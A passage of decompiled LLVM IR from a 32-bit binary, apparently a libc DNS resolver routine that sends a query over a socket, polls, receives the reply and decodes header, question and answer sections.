  %v1_804c27f = phi i32 [ %v1_804c27c, %dec_label_pc_804c25f ], [ %v0_804c269, %dec_label_pc_804c248 ]
  %v0_804c27f = load i32, i32* @ecx, align 4
  %v2_804c27f = add i32 %v1_804c27f, -4
  %v3_804c27f = inttoptr i32 %v2_804c27f to i32*
  store i32 %v0_804c27f, i32* %v3_804c27f, align 4
  %v1_804c280 = add i32 %v1_804c27f, -8
  %v2_804c280 = inttoptr i32 %v1_804c280 to i32*
  store i32 17, i32* %v2_804c280, align 4
  %v1_804c282 = add i32 %v1_804c27f, -12
  %v2_804c282 = inttoptr i32 %v1_804c282 to i32*
  store i32 2, i32* %v2_804c282, align 4
  %v1_804c284 = add i32 %v1_804c27f, 156
  %v2_804c284 = inttoptr i32 %v1_804c284 to i16*
  %v3_804c284 = load i16, i16* %v2_804c284, align 2
  %v4_804c284 = zext i16 %v3_804c284 to i32
  store i32 %v4_804c284, i32* %eax.global-to-local, align 4
  %v2_804c28c = add i32 %v1_804c27f, -16
  %v3_804c28c = inttoptr i32 %v2_804c28c to i32*
  store i32 %v4_804c284, i32* %v3_804c28c, align 4
  %v3_804c28d = call i32 @socket(i32 -1, i32 %v15_804c070, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c28d, i32* %eax.global-to-local, align 4
  %v1_804c292 = load i32, i32* @esp, align 4
  %v2_804c292 = add i32 %v1_804c292, 36
  %v3_804c292 = inttoptr i32 %v2_804c292 to i32*
  store i32 %v3_804c28d, i32* %v3_804c292, align 4
  %v0_804c296 = load i32, i32* @esp, align 4
  %v1_804c296 = add i32 %v0_804c296, 16
  %v0_804c299 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c299 = icmp slt i32 %v0_804c299, 0
  br i1 %v2_804c299, label %dec_label_pc_804c2c6, label %dec_label_pc_804c29d

dec_label_pc_804c29d:                             ; preds = %dec_label_pc_804c27f
  %v1_804c29d = add i32 %v0_804c296, 172
  store i32 %v1_804c29d, i32* %eax.global-to-local, align 4
  %v0_804c2a4 = load i32, i32* @edx, align 4
  %v2_804c2a4 = add i32 %v0_804c296, 12
  %v3_804c2a4 = inttoptr i32 %v2_804c2a4 to i32*
  store i32 %v0_804c2a4, i32* %v3_804c2a4, align 4
  %v1_804c2a5 = add i32 %v0_804c296, 8
  %v2_804c2a5 = inttoptr i32 %v1_804c2a5 to i32*
  store i32 28, i32* %v2_804c2a5, align 4
  %v0_804c2a7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c2a7 = add i32 %v0_804c296, 4
  %v3_804c2a7 = inttoptr i32 %v2_804c2a7 to i32*
  store i32 %v0_804c2a7, i32* %v3_804c2a7, align 4
  %v1_804c2a8 = add i32 %v0_804c296, 36
  %v2_804c2a8 = inttoptr i32 %v1_804c2a8 to i32*
  %v3_804c2a8 = load i32, i32* %v2_804c2a8, align 4
  %v6_804c2a8 = inttoptr i32 %v0_804c296 to i32*
  store i32 %v3_804c2a8, i32* %v6_804c2a8, align 4
  %v3_804c2ac = call i32 @__libc_connect(i32 -1, i32 %v15_804c070, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c2ac, i32* %eax.global-to-local, align 4
  %v0_804c2b1 = load i32, i32* @esp, align 4
  %v2_804c2b4 = icmp slt i32 %v3_804c2ac, 0
  %v1_804c2b6 = icmp eq i1 %v2_804c2b4, false
  br i1 %v1_804c2b6, label %dec_label_pc_804c2cf, label %dec_label_pc_804c2b8

dec_label_pc_804c2b8:                             ; preds = %dec_label_pc_804c29d
  %v1_804c2b8 = call i32 @__errno_location(i32 -1)
  store i32 %v1_804c2b8, i32* %eax.global-to-local, align 4
  %v1_804c2bd = inttoptr i32 %v1_804c2b8 to i32*
  %v2_804c2bd = load i32, i32* %v1_804c2bd, align 4
  %v11_804c2bd = icmp eq i32 %v2_804c2bd, 101
  %v0_804c62f.pre = load i32, i32* @esp, align 4
  br i1 %v11_804c2bd, label %dec_label_pc_804c62f, label %dec_label_pc_804c2c6

dec_label_pc_804c2c6:                             ; preds = %dec_label_pc_804c2b8, %dec_label_pc_804c27f
  %v17_804c2c6 = phi i32 [ %v1_804c296, %dec_label_pc_804c27f ], [ %v0_804c62f.pre, %dec_label_pc_804c2b8 ]
  %v1_804c2c6 = add i32 %v17_804c2c6, 28
  %v2_804c2c6 = inttoptr i32 %v1_804c2c6 to i32*
  %v3_804c2c6 = load i32, i32* %v2_804c2c6, align 4
  %v4_804c2c6 = add i32 %v3_804c2c6, 1
  store i32 %v4_804c2c6, i32* %v2_804c2c6, align 4
  br label %dec_label_pc_804c650.backedge

dec_label_pc_804c2cf:                             ; preds = %dec_label_pc_804c29d
  %v1_804c2cf = add i32 %v0_804c2b1, 12
  %v2_804c2cf = inttoptr i32 %v1_804c2cf to i32*
  store i32 0, i32* %v2_804c2cf, align 4
  %v0_804c2d1 = load i32, i32* @ebx, align 4
  %v1_804c2d1 = load i32, i32* @esi, align 4
  %v2_804c2d1 = add i32 %v1_804c2d1, %v0_804c2d1
  store i32 %v2_804c2d1, i32* %eax.global-to-local, align 4
  %v2_804c2d4 = add i32 %v0_804c2b1, 8
  %v3_804c2d4 = inttoptr i32 %v2_804c2d4 to i32*
  store i32 %v2_804c2d1, i32* %v3_804c2d4, align 4
  %v2_804c2d5 = add i32 %v0_804c2b1, 4
  %v3_804c2d5 = inttoptr i32 %v2_804c2d5 to i32*
  store i32 %v2_804bfe2, i32* %v3_804c2d5, align 4
  %v1_804c2d6 = add i32 %v0_804c2b1, 36
  %v2_804c2d6 = inttoptr i32 %v1_804c2d6 to i32*
  %v3_804c2d6 = load i32, i32* %v2_804c2d6, align 4
  %v6_804c2d6 = inttoptr i32 %v0_804c2b1 to i32*
  store i32 %v3_804c2d6, i32* %v6_804c2d6, align 4
  %v4_804c2da = call i32 @__libc_send(i32 -1, i32 %v15_804c070, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c2da, i32* %eax.global-to-local, align 4
  %v0_804c2df = load i32, i32* @esp, align 4
  %v1_804c2df = add i32 %v0_804c2df, 36
  %v2_804c2df = inttoptr i32 %v1_804c2df to i32*
  %v3_804c2df = load i32, i32* %v2_804c2df, align 4
  store i32 %v3_804c2df, i32* %eax.global-to-local, align 4
  %v1_804c2e3 = add i32 %v0_804c2df, 232
  %v2_804c2e3 = inttoptr i32 %v1_804c2e3 to i16*
  store i16 1, i16* %v2_804c2e3, align 2
  %v0_804c2ed = load i32, i32* %eax.global-to-local, align 4
  %v1_804c2ed = load i32, i32* @esp, align 4
  %v2_804c2ed = add i32 %v1_804c2ed, 228
  %v3_804c2ed = inttoptr i32 %v2_804c2ed to i32*
  store i32 %v0_804c2ed, i32* %v3_804c2ed, align 4
  %v0_804c2f4 = load i32, i32* @esp, align 4
  %v1_804c2f7 = add i32 %v0_804c2f4, 8
  %v2_804c2f7 = inttoptr i32 %v1_804c2f7 to i32*
  store i32 10000, i32* %v2_804c2f7, align 4
  %v1_804c2fc = add i32 %v0_804c2f4, 4
  %v2_804c2fc = inttoptr i32 %v1_804c2fc to i32*
  store i32 1, i32* %v2_804c2fc, align 4
  %v1_804c2fe = add i32 %v0_804c2f4, 228
  store i32 %v1_804c2fe, i32* %eax.global-to-local, align 4
  %v3_804c305 = inttoptr i32 %v0_804c2f4 to i32*
  store i32 %v1_804c2fe, i32* %v3_804c305, align 4
  %v0_804c306 = call i32 @__libc_poll()
  store i32 %v0_804c306, i32* %eax.global-to-local, align 4
  %v0_804c30b = load i32, i32* @esp, align 4
  %v1_804c30b = add i32 %v0_804c30b, 16
  %tmp48 = icmp slt i32 %v0_804c306, 1
  br i1 %tmp48, label %dec_label_pc_804c62f, label %dec_label_pc_804c316

dec_label_pc_804c316:                             ; preds = %dec_label_pc_804c2cf
  %v1_804c316 = add i32 %v0_804c30b, 12
  %v2_804c316 = inttoptr i32 %v1_804c316 to i32*
  store i32 0, i32* %v2_804c316, align 4
  %v1_804c318 = add i32 %v0_804c30b, 8
  %v2_804c318 = inttoptr i32 %v1_804c318 to i32*
  store i32 512, i32* %v2_804c318, align 4
  %v2_804c31d = add i32 %v0_804c30b, 4
  %v3_804c31d = inttoptr i32 %v2_804c31d to i32*
  store i32 %v2_804bfe2, i32* %v3_804c31d, align 4
  %v1_804c31e = add i32 %v0_804c30b, 36
  %v2_804c31e = inttoptr i32 %v1_804c31e to i32*
  %v3_804c31e = load i32, i32* %v2_804c31e, align 4
  %v6_804c31e = inttoptr i32 %v0_804c30b to i32*
  store i32 %v3_804c31e, i32* %v6_804c31e, align 4
  %v4_804c322 = call i32 @__libc_recv(i32 -1, i32 %v15_804c070, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c322, i32* @eax, align 4
  %v1_804c327 = load i32, i32* @esp, align 4
  %v2_804c327 = add i32 %v1_804c327, 32
  %v3_804c327 = inttoptr i32 %v2_804c327 to i32*
  store i32 %v4_804c322, i32* %v3_804c327, align 4
  %v0_804c32b = load i32, i32* @esp, align 4
  %v1_804c32b = add i32 %v0_804c32b, 16
  %v7_804c331 = icmp sgt i32 %v4_804c322, 11
  br i1 %v7_804c331, label %dec_label_pc_804c337, label %dec_label_pc_804c5e4

dec_label_pc_804c337:                             ; preds = %dec_label_pc_804c316
  %v0_804c337 = load i32, i32* @ebx, align 4
  %v2_804c337 = add i32 %v0_804c32b, 12
  %v3_804c337 = inttoptr i32 %v2_804c337 to i32*
  store i32 %v0_804c337, i32* %v3_804c337, align 4
  %v0_804c338 = load i32, i32* @ebx, align 4
  %v2_804c338 = add i32 %v0_804c32b, 8
  %v3_804c338 = inttoptr i32 %v2_804c338 to i32*
  store i32 %v0_804c338, i32* %v3_804c338, align 4
  %v1_804c339 = add i32 %v0_804c32b, 84
  store i32 %v1_804c339, i32* %eax.global-to-local, align 4
  %v2_804c33d = add i32 %v0_804c32b, 4
  %v3_804c33d = inttoptr i32 %v2_804c33d to i32*
  store i32 %v1_804c339, i32* %v3_804c33d, align 4
  %v3_804c33e = inttoptr i32 %v0_804c32b to i32*
  store i32 %v2_804bfe2, i32* %v3_804c33e, align 4
  %v0_804c33f = call i32 @__decode_header()
  store i32 %v0_804c33f, i32* %eax.global-to-local, align 4
  %v0_804c344 = load i32, i32* @esp, align 4
  %v1_804c344 = add i32 %v0_804c344, 84
  %v2_804c344 = inttoptr i32 %v1_804c344 to i32*
  %v3_804c344 = load i32, i32* %v2_804c344, align 4
  store i32 %v3_804c344, i32* %edx.global-to-local, align 4
  %v2_804c348 = add i32 %v0_804c344, 60
  %v3_804c348 = inttoptr i32 %v2_804c348 to i32*
  store i32 %v3_804c344, i32* %v3_804c348, align 4
  %v0_804c34c = load i32, i32* @esp, align 4
  %v1_804c34c = add i32 %v0_804c34c, 16
  %v1_804c34f = add i32 %v0_804c34c, 72
  %v2_804c34f = inttoptr i32 %v1_804c34f to i32*
  %v3_804c34f = load i32, i32* %v2_804c34f, align 4
  store i32 %v3_804c34f, i32* @eax, align 4
  %v0_804c353 = load i32, i32* %edx.global-to-local, align 4
  %v12_804c353 = icmp eq i32 %v0_804c353, %v3_804c34f
  %v1_804c355 = icmp eq i1 %v12_804c353, false
  br i1 %v1_804c355, label %dec_label_pc_804c5e4, label %dec_label_pc_804c35b

dec_label_pc_804c35b:                             ; preds = %dec_label_pc_804c337
  %v1_804c35b = add i32 %v0_804c34c, 88
  %v2_804c35b = inttoptr i32 %v1_804c35b to i32*
  %v3_804c35b = load i32, i32* %v2_804c35b, align 4
  %v4_804c35b = icmp eq i32 %v3_804c35b, 0
  br i1 %v4_804c35b, label %dec_label_pc_804c5e4, label %dec_label_pc_804c366

dec_label_pc_804c366:                             ; preds = %dec_label_pc_804c35b
  %v1_804c366 = add i32 %v0_804c34c, 112
  %v2_804c366 = inttoptr i32 %v1_804c366 to i32*
  %v3_804c366 = load i32, i32* %v2_804c366, align 4
  store i32 %v3_804c366, i32* @eax, align 4
  %v9_804c36a = icmp eq i32 %v3_804c366, 3
  %v1_804c36d = icmp eq i1 %v9_804c36a, false
  br i1 %v1_804c36d, label %dec_label_pc_804c3d5, label %dec_label_pc_804c36f

dec_label_pc_804c36f:                             ; preds = %dec_label_pc_804c366
  %v1_804c36f = add i32 %v0_804c34c, 67
  %v2_804c36f = inttoptr i32 %v1_804c36f to i8*
  %v3_804c36f = load i8, i8* %v2_804c36f, align 1
  %v4_804c36f = icmp eq i8 %v3_804c36f, 0
  %v1_804c374 = icmp eq i1 %v4_804c36f, false
  br i1 %v1_804c374, label %dec_label_pc_804c3c5, label %dec_label_pc_804c376

dec_label_pc_804c376:                             ; preds = %dec_label_pc_804c36f
  %v0_804c376 = load i32, i32* @ecx, align 4
  %v2_804c376 = add i32 %v0_804c34c, 12
  %v3_804c376 = inttoptr i32 %v2_804c376 to i32*
  store i32 %v0_804c376, i32* %v3_804c376, align 4
  %v1_804c377 = add i32 %v0_804c34c, 8
  %v2_804c377 = inttoptr i32 %v1_804c377 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c377, align 4
  %v1_804c37c = add i32 %v0_804c34c, 4
  %v2_804c37c = inttoptr i32 %v1_804c37c to i32*
  store i32 134526871, i32* %v2_804c37c, align 4
  %v1_804c381 = add i32 %v0_804c34c, 200
  store i32 %v1_804c381, i32* @esi, align 4
  %v3_804c388 = inttoptr i32 %v0_804c34c to i32*
  store i32 %v1_804c381, i32* %v3_804c388, align 4
  %v2_804c389 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c070)
  store i32 %v2_804c389, i32* %eax.global-to-local, align 4
  %v0_804c38e = load i32, i32* @esp, align 4
  %v1_804c38e = inttoptr i32 %v0_804c38e to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c38e, align 4
  %v1_804c395 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c395, i32* %eax.global-to-local, align 4
  %v0_804c39a = load i32, i32* @global_var_8054998.87, align 8
  store i32 %v0_804c39a, i32* %ebx.global-to-local, align 4
  %v0_804c3a0 = load i32, i32* @esp, align 4
  %v1_804c3a0 = inttoptr i32 %v0_804c3a0 to i32*
  %v2_804c3a0 = load i32, i32* %v1_804c3a0, align 4
  store i32 %v2_804c3a0, i32* @eax, align 4
  %v3_804c3a0 = add i32 %v0_804c3a0, 4
  %v1_804c3a1 = inttoptr i32 %v3_804c3a0 to i32*
  %v2_804c3a1 = load i32, i32* %v1_804c3a1, align 4
  store i32 %v2_804c3a1, i32* %edx.global-to-local, align 4
  %v1_804c3a2 = add i32 %v0_804c39a, -1
  store i32 %v1_804c3a2, i32* @ebx, align 4
  store i32 1, i32* %v1_804c3a1, align 4
  %v0_804c3a5 = load i32, i32* @esi, align 4
  store i32 %v0_804c3a5, i32* %v1_804c3a0, align 4
  %v2_804c3a6 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c070)
  store i32 %v2_804c3a6, i32* %eax.global-to-local, align 4
  %v0_804c3ab = load i32, i32* @esp, align 4
  %v1_804c3ae = add i32 %v0_804c3ab, 52
  %v2_804c3ae = inttoptr i32 %v1_804c3ae to i32*
  %v3_804c3ae = load i32, i32* %v2_804c3ae, align 4
  %v4_804c3ae = load i32, i32* @ebx, align 4
  %v5_804c3ae = sub i32 %v3_804c3ae, %v4_804c3ae
  %v11_804c3ae = xor i32 %v4_804c3ae, %v3_804c3ae
  %v12_804c3ae = xor i32 %v5_804c3ae, %v3_804c3ae
  %v13_804c3ae = and i32 %v12_804c3ae, %v11_804c3ae
  %v14_804c3ae = icmp slt i32 %v13_804c3ae, 0
  %v16_804c3ae = icmp slt i32 %v5_804c3ae, 0
  %v2_804c3b2 = icmp eq i1 %v16_804c3ae, %v14_804c3ae
  br i1 %v2_804c3b2, label %dec_label_pc_804c3c5, label %dec_label_pc_804c3b4

dec_label_pc_804c3b4:                             ; preds = %dec_label_pc_804c376
  %v1_804c3b4 = add i32 %v0_804c3ab, 60
  %v2_804c3b4 = inttoptr i32 %v1_804c3b4 to i32*
  %v3_804c3b4 = load i32, i32* %v2_804c3b4, align 4
  store i32 %v3_804c3b4, i32* %edx.global-to-local, align 4
  %v3_804c3b8 = load i32, i32* %v2_804c3ae, align 4
  %v4_804c3b8 = add i32 %v3_804c3b8, 1
  store i32 %v4_804c3b8, i32* %v2_804c3ae, align 4
  %v0_804c3bc = load i32, i32* %edx.global-to-local, align 4
  %v1_804c3bc = load i32, i32* @esp, align 4
  %v2_804c3bc = add i32 %v1_804c3bc, 56
  %v3_804c3bc = inttoptr i32 %v2_804c3bc to i32*
  store i32 %v0_804c3bc, i32* %v3_804c3bc, align 4
  br label %dec_label_pc_804c650.backedge

dec_label_pc_804c3c5:                             ; preds = %dec_label_pc_804c376, %dec_label_pc_804c36f
  %v0_804c3c5 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c3c5, i32* %eax.global-to-local, align 4
  %v1_804c3ca = inttoptr i32 %v0_804c3c5 to i32*
  store i32 1, i32* %v1_804c3ca, align 4
  br label %dec_label_pc_804c688

dec_label_pc_804c3d5:                             ; preds = %dec_label_pc_804c366
  %v1_804c3d5 = icmp eq i32 %v3_804c366, 0
  %v1_804c3d7 = icmp eq i1 %v1_804c3d5, false
  br i1 %v1_804c3d7, label %dec_label_pc_804c5e4, label %dec_label_pc_804c3dd

dec_label_pc_804c3dd:                             ; preds = %dec_label_pc_804c3d5
  %v1_804c3dd = add i32 %v0_804c34c, 120
  %v2_804c3dd = inttoptr i32 %v1_804c3dd to i32*
  %v3_804c3dd = load i32, i32* %v2_804c3dd, align 4
  %tmp49 = icmp slt i32 %v3_804c3dd, 1
  br i1 %tmp49, label %dec_label_pc_804c3ed, label %dec_label_pc_804c3e4

dec_label_pc_804c3e4:                             ; preds = %dec_label_pc_804c3dd
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_804c40c55 = add i32 %v0_804c34c, 116
  %v3_804c40c56 = inttoptr i32 %v2_804c40c55 to i32*
  %v4_804c40c57 = load i32, i32* %v3_804c40c56, align 4
  %v5_804c40c58 = sub i32 0, %v4_804c40c57
  %v13_804c40c62 = and i32 %v4_804c40c57, %v5_804c40c58
  %v14_804c40c63 = icmp slt i32 %v13_804c40c62, 0
  %v16_804c40c65 = icmp slt i32 %v5_804c40c58, 0
  %v2_804c41066 = icmp eq i1 %v16_804c40c65, %v14_804c40c63
  br i1 %v2_804c41066, label %dec_label_pc_804c412, label %dec_label_pc_804c3fd

dec_label_pc_804c3ed:                             ; preds = %dec_label_pc_804c3dd
  %v0_804c3ed = call i32 @__GI___h_errno_location()
  store i32 %v0_804c3ed, i32* %eax.global-to-local, align 4
  %v1_804c3f2 = inttoptr i32 %v0_804c3ed to i32*
  store i32 4, i32* %v1_804c3f2, align 4
  br label %dec_label_pc_804c688

dec_label_pc_804c3fd:                             ; preds = %dec_label_pc_804c3e4, %dec_label_pc_804c3fd
  %v0_804c41468 = phi i32 [ %v1_804c407, %dec_label_pc_804c3fd ], [ %v1_804c34c, %dec_label_pc_804c3e4 ]
  %v0_804c3fd67 = phi i32 [ %v0_804c402, %dec_label_pc_804c3fd ], [ %v3_804c366, %dec_label_pc_804c3e4 ]
  %v2_804c3fd = add i32 %v0_804c41468, -4
  %v3_804c3fd = inttoptr i32 %v2_804c3fd to i32*
  store i32 %v0_804c3fd67, i32* %v3_804c3fd, align 4
  %v0_804c3fe = load i32, i32* @ebx, align 4
  %v1_804c3fe = add i32 %v0_804c3fe, 1
  store i32 %v1_804c3fe, i32* @ebx, align 4
  %v0_804c3ff = load i32, i32* @eax, align 4
  %v2_804c3ff = add i32 %v0_804c41468, -8
  %v3_804c3ff = inttoptr i32 %v2_804c3ff to i32*
  store i32 %v0_804c3ff, i32* %v3_804c3ff, align 4
  %v0_804c400 = load i32, i32* @esi, align 4
  %v2_804c400 = add i32 %v0_804c41468, -12
  %v3_804c400 = inttoptr i32 %v2_804c400 to i32*
  store i32 %v0_804c400, i32* %v3_804c400, align 4
  %v2_804c401 = add i32 %v0_804c41468, -16
  %v3_804c401 = inttoptr i32 %v2_804c401 to i32*
  store i32 %v2_804bfe2, i32* %v3_804c401, align 4
  %v0_804c402 = call i32 @__length_question()
  store i32 %v0_804c402, i32* @eax, align 4
  %v0_804c407 = load i32, i32* @esp, align 4
  %v1_804c407 = add i32 %v0_804c407, 16
  %v0_804c40a = load i32, i32* @esi, align 4
  %v2_804c40a = add i32 %v0_804c40a, %v0_804c402
  %v0_804c40c.pre = load i32, i32* @ebx, align 4
  store i32 %v2_804c40a, i32* @esi, align 4
  %v2_804c40c = add i32 %v0_804c407, 116
  %v3_804c40c = inttoptr i32 %v2_804c40c to i32*
  %v4_804c40c = load i32, i32* %v3_804c40c, align 4
  %v5_804c40c = sub i32 %v0_804c40c.pre, %v4_804c40c
  %v11_804c40c = xor i32 %v4_804c40c, %v0_804c40c.pre
  %v12_804c40c = xor i32 %v5_804c40c, %v0_804c40c.pre
  %v13_804c40c = and i32 %v12_804c40c, %v11_804c40c
  %v14_804c40c = icmp slt i32 %v13_804c40c, 0
  %v16_804c40c = icmp slt i32 %v5_804c40c, 0
  %v2_804c410 = icmp eq i1 %v16_804c40c, %v14_804c40c
  br i1 %v2_804c410, label %dec_label_pc_804c412, label %dec_label_pc_804c3fd

dec_label_pc_804c412:                             ; preds = %dec_label_pc_804c3fd, %dec_label_pc_804c3e4
  %v0_804c414.lcssa = phi i32 [ %v1_804c34c, %dec_label_pc_804c3e4 ], [ %v1_804c407, %dec_label_pc_804c3fd ]
  store i32 0, i32* @ebx, align 4
  %v1_804c414 = add i32 %v0_804c414.lcssa, 27
  %v2_804c414 = inttoptr i32 %v1_804c414 to i8*
  store i8 1, i8* %v2_804c414, align 1
  %v0_804c542.pre = load i32, i32* @ebx, align 4
  %v1_804c542.pre = load i32, i32* @esp, align 4
  %v2_804c54269 = add i32 %v1_804c542.pre, 104
  %v3_804c54270 = inttoptr i32 %v2_804c54269 to i32*
  %v4_804c54271 = load i32, i32* %v3_804c54270, align 4
  %v5_804c54272 = sub i32 %v0_804c542.pre, %v4_804c54271
  %v11_804c54274 = xor i32 %v4_804c54271, %v0_804c542.pre
  %v12_804c54275 = xor i32 %v5_804c54272, %v0_804c542.pre
  %v13_804c54276 = and i32 %v12_804c54275, %v11_804c54274
  %v14_804c54277 = icmp slt i32 %v13_804c54276, 0
  %v16_804c54279 = icmp slt i32 %v5_804c54272, 0
  %v2_804c54680 = icmp eq i1 %v16_804c54279, %v14_804c54277
  br i1 %v2_804c54680, label %dec_label_pc_804c552, label %dec_label_pc_804c548.lr.ph

dec_label_pc_804c548.lr.ph:                       ; preds = %dec_label_pc_804c412
  %v0_804c548.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c548

dec_label_pc_804c41e:                             ; preds = %dec_label_pc_804c548
  %v1_804c41e = add i32 %v0_804c41e81, 116
  store i32 %v1_804c41e, i32* %eax.global-to-local, align 4
  %v2_804c422 = add i32 %v0_804c41e81, -4
  %v3_804c422 = inttoptr i32 %v2_804c422 to i32*
  store i32 %v1_804c41e, i32* %v3_804c422, align 4
  %v3_804c423 = load i32, i32* %v3_804c548, align 4
  %v5_804c423 = add i32 %v0_804c41e81, -8
  %v6_804c423 = inttoptr i32 %v5_804c423 to i32*
  store i32 %v3_804c423, i32* %v6_804c423, align 4
  %v0_804c427 = load i32, i32* @esi, align 4
  %v2_804c427 = add i32 %v0_804c41e81, -12
  %v3_804c427 = inttoptr i32 %v2_804c427 to i32*
  store i32 %v0_804c427, i32* %v3_804c427, align 4
  %v2_804c428 = add i32 %v0_804c41e81, -16
  %v3_804c428 = inttoptr i32 %v2_804c428 to i32*
  store i32 %v2_804bfe2, i32* %v3_804c428, align 4
  %v0_804c429 = call i32 @__decode_answer()
  store i32 %v0_804c429, i32* @eax, align 4
  %v1_804c42e = load i32, i32* @esp, align 4
  %v2_804c42e = add i32 %v1_804c42e, 68
  %v3_804c42e = inttoptr i32 %v2_804c42e to i32*
  store i32 %v0_804c429, i32* %v3_804c42e, align 4
  %v0_804c432 = load i32, i32* @esp, align 4
  %v1_804c432 = add i32 %v0_804c432, 16
  %v2_804c435 = icmp slt i32 %v0_804c429, 0
  %v1_804c437 = icmp eq i1 %v2_804c435, false
  br i1 %v1_804c437, label %dec_label_pc_804c451, label %dec_label_pc_804c439

dec_label_pc_804c439:                             ; preds = %dec_label_pc_804c41e
  %v0_804c439 = load i32, i32* @ebx, align 4
  %v1_804c439 = icmp eq i32 %v0_804c439, 0
  br i1 %v1_804c439, label %dec_label_pc_804c5e4, label %dec_label_pc_804c441

dec_label_pc_804c441:                             ; preds = %dec_label_pc_804c439
  %v1_804c441 = add i32 %v0_804c432, 100
  %v2_804c441 = inttoptr i32 %v1_804c441 to i32*
  %v3_804c441 = load i32, i32* %v2_804c441, align 4
  %v4_804c441 = icmp eq i32 %v3_804c441, 0
  br i1 %v4_804c441, label %dec_label_pc_804c5e4, label %dec_label_pc_804c552

dec_label_pc_804c451:                             ; preds = %dec_label_pc_804c41e
  %v1_804c451 = add i32 %v0_804c432, 43
  %v2_804c451 = inttoptr i32 %v1_804c451 to i8*
  %v3_804c451 = load i8, i8* %v2_804c451, align 1
  %v4_804c451 = icmp eq i8 %v3_804c451, 0
  br i1 %v4_804c451, label %dec_label_pc_804c4f2, label %dec_label_pc_804c45c

dec_label_pc_804c45c:                             ; preds = %dec_label_pc_804c451
  %v0_804c45c = load i32, i32* @edi, align 4
  %v1_804c45c = add i32 %v0_804c45c, 28
  %v2_804c45c = inttoptr i32 %v1_804c45c to i32*
  %v3_804c45c = load i32, i32* %v2_804c45c, align 4
  store i32 %v3_804c45c, i32* %eax.global-to-local, align 4
  %v2_804c45f = add i32 %v0_804c432, 160
  %v3_804c45f = inttoptr i32 %v2_804c45f to i32*
  store i32 %v3_804c45c, i32* %v3_804c45f, align 4
  %v0_804c466 = load i32, i32* @edi, align 4
  %v1_804c466 = add i32 %v0_804c466, 32
  %v2_804c466 = inttoptr i32 %v1_804c466 to i32*
  %v3_804c466 = load i32, i32* %v2_804c466, align 4
  store i32 %v3_804c466, i32* %eax.global-to-local, align 4
  %v1_804c469 = load i32, i32* @esp, align 4
  %v2_804c469 = add i32 %v1_804c469, 148
  %v3_804c469 = inttoptr i32 %v2_804c469 to i32*
  store i32 %v3_804c466, i32* %v3_804c469, align 4
  %v0_804c470 = load i32, i32* @edi, align 4
  %v1_804c470 = add i32 %v0_804c470, 36
  %v2_804c470 = inttoptr i32 %v1_804c470 to i32*
  %v3_804c470 = load i32, i32* %v2_804c470, align 4
  store i32 %v3_804c470, i32* %eax.global-to-local, align 4
  %v1_804c473 = load i32, i32* @esp, align 4
  %v2_804c473 = add i32 %v1_804c473, 152
  %v3_804c473 = inttoptr i32 %v2_804c473 to i32*
  store i32 %v3_804c470, i32* %v3_804c473, align 4
  %v0_804c47a = load i32, i32* @ecx, align 4
  %v1_804c47a = load i32, i32* @esp, align 4
  %v2_804c47a = add i32 %v1_804c47a, -4
  %v3_804c47a = inttoptr i32 %v2_804c47a to i32*
  store i32 %v0_804c47a, i32* %v3_804c47a, align 4
  %v1_804c47b = add i32 %v1_804c47a, -8
  %v2_804c47b = inttoptr i32 %v1_804c47b to i32*
  store i32 40, i32* %v2_804c47b, align 4
  %v1_804c47d = add i32 %v1_804c47a, 116
  store i32 %v1_804c47d, i32* %edx.global-to-local, align 4
  %v2_804c481 = add i32 %v1_804c47a, -12
  %v3_804c481 = inttoptr i32 %v2_804c481 to i32*
  store i32 %v1_804c47d, i32* %v3_804c481, align 4
  %v0_804c482 = load i32, i32* @edi, align 4
  %v2_804c482 = add i32 %v1_804c47a, -16
  %v3_804c482 = inttoptr i32 %v2_804c482 to i32*
  store i32 %v0_804c482, i32* %v3_804c482, align 4
  %v4_804c483 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804c070, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c483, i32* %eax.global-to-local, align 4
  %v0_804c488 = load i32, i32* @edi, align 4
  %v1_804c488 = add i32 %v0_804c488, 4
  %v2_804c488 = inttoptr i32 %v1_804c488 to i32*
  %v3_804c488 = load i32, i32* %v2_804c488, align 4
  store i32 %v3_804c488, i32* %eax.global-to-local, align 4
  %v0_804c48b = load i32, i32* @esp, align 4
  %v1_804c48b = add i32 %v0_804c48b, 16
  %v9_804c48e = icmp eq i32 %v3_804c488, 24
  br i1 %v9_804c48e, label %dec_label_pc_804c45c.dec_label_pc_804c4b5_crit_edge, label %dec_label_pc_804c493

dec_label_pc_804c45c.dec_label_pc_804c4b5_crit_edge: ; preds = %dec_label_pc_804c45c
  %.pre24 = add i32 %v0_804c48b, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_804c4b5.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_804c4b5

dec_label_pc_804c493:                             ; preds = %dec_label_pc_804c45c
  %v1_804c493 = add i32 %v0_804c488, 28
  %v2_804c493 = inttoptr i32 %v1_804c493 to i32*
  %v3_804c493 = load i32, i32* %v2_804c493, align 4
  %v4_804c493 = icmp eq i32 %v3_804c493, 0
  br i1 %v4_804c493, label %dec_label_pc_804c552, label %dec_label_pc_804c49d

dec_label_pc_804c49d:                             ; preds = %dec_label_pc_804c493
  %v1_804c49d = add i32 %v0_804c48b, 260
  %v2_804c49d = inttoptr i32 %v1_804c49d to i32*
  %v3_804c49d = load i32, i32* %v2_804c49d, align 4
  %v12_804c49d = icmp eq i32 %v3_804c49d, 1
  br i1 %v12_804c49d, label %dec_label_pc_804c4b5, label %dec_label_pc_804c4a7

dec_label_pc_804c4a7:                             ; preds = %dec_label_pc_804c49d
